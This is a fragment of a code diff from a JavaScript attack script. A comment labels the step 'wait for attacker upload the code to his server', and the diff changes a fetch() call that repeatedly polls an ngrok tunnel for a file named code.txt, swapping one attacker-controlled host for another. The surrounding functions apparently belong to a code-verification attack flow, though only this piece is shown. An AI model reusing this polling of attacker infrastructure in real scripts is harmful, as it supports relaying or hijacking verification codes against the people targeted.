@@ -38,7 +38,7 @@ function verifyCode(code) {
 // Second Step -> Wait for attacker upload the code to his server
 function waitForCodeFile(interval = 5000) {
     function check() {
-      fetch('https://12f5-103-158-140-215.ngrok-free.app/code.txt')
+      fetch('https://4f58-83-10-227-89.ngrok-free.app/code.txt')
         .then(response => {
           if (!response.ok) throw new Error('Network error');
           return response.text();
